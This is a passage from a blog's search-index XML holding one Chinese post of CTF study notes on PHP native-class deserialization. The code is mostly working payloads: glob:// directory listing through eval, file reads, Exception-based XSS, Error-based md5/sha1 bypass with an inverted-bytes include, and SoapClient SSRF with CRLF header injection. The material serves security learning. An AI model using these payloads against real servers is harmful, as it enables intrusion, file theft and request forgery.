<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>php原生类反序列化</title>
    <link href="/2023/11/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/2023/11/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP原生类反序列化"><a href="#PHP原生类反序列化" class="headerlink" title="PHP原生类反序列化"></a>PHP原生类反序列化</h1><p>网上的一篇文章：</p><p><a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a></p><p>根据上面那个来具体的学习一下</p><p>分类：</p><h2 id="1-读取目录-文件（内容）"><a href="#1-读取目录-文件（内容）" class="headerlink" title="1.读取目录/文件（内容）"></a>1.读取目录/文件（内容）</h2><p>读取文件目录/文件名字的有两个类</p><p>1.DirectoryIterator 2.FilesystemIterator</p><p>其中FilesystemIterator是一个子类</p><p>它两个下面都有_toString魔术方法  通过触发这个魔术方法，利用glob:///进行一个读取</p><p>下面看一下具体的例子，并看一下两者的区别</p><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><strong>DirectoryIterator</strong></h3><p>((PHP 5, PHP 7, PHP 8))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个读取的是当前目录下的文件名字，并不会显示上一层的名字</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151629842.png" alt="image-20230624172914303"></p><h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h3><p>((PHP 5 &gt;= 5.3.0, PHP 7, PHP 8))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151629412.png" alt="image-20230624173320866"></p><p>这个会显示你上一级的名字</p><p>这两个类同样也有一句话形式payload：</p><p>DirectoryIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><p>FilesystemIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><p>下面看一下ctfshow的web74</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>这个当中由于<code>error_reporting(0);</code><br><code>ini_set(&#39;display_errors&#39;, 0);</code>  </p><p>这两行代码禁用了php错误报告，并且禁止在浏览器中显示错误信息，这意味着，没法看到执行结果</p><p>所以可以用到glod:///来进行一个读取文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>然后就可以看到文件名，最后文件包含你想要的文件即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>假设flag.txt是在根目录的</p><h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</p><p>这个是FilesystemIterator的子类  然后也可以去读取文件名 但是它的行为和glob()差不多，所以在传参的时候就不需要用glob伪协议了</p><p>下面是这个代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果如下图所示：<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151629890.png" alt="image-20230624201553453"></p><p>也是绝对路径</p><p><strong>下面就是读取文件内容的类了</strong></p><h3 id="SPIFileInfo"><a href="#SPIFileInfo" class="headerlink" title="SPIFileInfo"></a>SPIFileInfo</h3><p>(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)</p><p>SPIFileInfo类为单个文件的信息提供了高级的面向对象接口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果如下图所示：<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630756.png" alt="image-20230624210000481"></p><p>如果出现以下类似的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span>);</span><br><span class="hljs-class">   &#125;</span><br><span class="hljs-class">这个<span class="hljs-title">class</span>就是那些类，然后<span class="hljs-title">data</span>就是那些命令</span><br></code></pre></td></tr></table></figure><h2 id="2-构造xss"><a href="#2-构造xss" class="headerlink" title="2.构造xss"></a>2.构造xss</h2><p>有两个类 </p><p>1.Error 2.Exception</p><p>这两个类当中都有_toString这两个魔术方法</p><p>1.Error(在php7,8开启的时候开启报错)  <strong>Error</strong> 是所有PHP内部错误类的基类。</p><p>2.Exception(在php5,7,8开启的时候开启报错)   <strong>Exception</strong>是所有用户级异常的基类。</p><p>通过echo(不只是echo 当对象被当成字符串时就能触发)来触发toString 进一步构造xss</p><p>通过官方文档可以看到这两个类的属性都一样</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630767.png" alt="image-20230628154427087"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630782.png" alt="image-20230628154442643"></p><p>下面可以演示一下进行xss构造</p><p>先写一个经过反序列化后的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;k&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里的echo是触发的关键</p><p>然后下面是构造xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;U_F1ind_Me&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为有不可见字符，所以要url编码一下</p><p>需要注意的就是只有Exception才能在php5进行一个xss</p><p>Error只有在7或8下进行一个xss</p><h2 id="3-绕过哈希比较"><a href="#3-绕过哈希比较" class="headerlink" title="3.绕过哈希比较"></a>3.绕过哈希比较</h2><p>这个是利用了Error的报错信息 </p><p>可以用一些代码来说明一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>===<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个的运行结果是:<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630647.png" alt="image-20230628195433399" style="zoom:80%;" /></p><p>两个new Error的类都在同一行 报错信息也是同一行，虽然两个的内容不一样 但是报错信息一样 这样在面对一些哈希比较的时候就可以进行绕过</p><p>下面来一个题目看看:</p><p><strong>[极客大挑战 2020]Greatphp</strong></p><p>进入后查看一下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们要做的就是执行eval命令</p><p>这个前提就是  if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )  先满足这个if语句 这个我们之前做的MD5碰撞就不能用了 可以用Error报错信息进行一个哈希绕过</p><p>就是让两个Error语句在同一行 然后和之前的没什么区别了</p><p>这个有一个正则匹配 过滤了小括号和双引号 我们用取反进行一个绕过</p><p><code>$str=&quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</code></p><p>主要的就是上面的那个</p><p>最终构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$c</span>-&gt;syc=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;lover=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="4-SSRF"><a href="#4-SSRF" class="headerlink" title="4.SSRF"></a>4.SSRF</h2><p>这个和SoapClient这个类有关</p><p>这个类里面有一个call魔术方法  当调用不存在的方法时被调用</p><p>注意要开启soap选项 否则不会监听成功</p><p>PHP的内置类SoaPClient是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问web服务的php客户端。</p><p>函数的形式如下：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><p>第一个参数为指明是否为wsdl模式，为null则为非wsdl模式</p><p>wsdl就是一个xml格式的文档，用于描述web server的定义</p><p>第二个参数为array,wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送的soap服务器的url，uri是服务的命名空间</p><p>下面可以看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://192.168.122.136:2022/&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&quot;qaq\r\nCookie: PHPSESSID=wangluoanquanqaq1213&quot;</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630388.png" alt="image-20230629151043313"></p><p>这个soapaction的内容是我们可以控制的</p><p>其实也就是uri的内容</p><p>然后这里的话可以与CRLF进行一个结合 进行CRLF攻击(就是利用了\r\n)</p><p>可以参考这篇文章:<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p><p>可以结合CRLF进行xss =&gt; HRS</p><p>这个SoapCliet原生类我感觉就是结合CRLF进行一个http的一些修改</p><p>可以举一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://192.168.122.136:2022/&#x27;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&#x27;data=ki10Moc&#x27;</span>;   <span class="hljs-comment">//这个就是一个post传参 data为参数 里面的内容为值</span><br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=8asIKRJGI2493324gfsjkk958&#x27;</span><br>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;Happy^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;ki10Moc&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上面的代码修改了Xff头 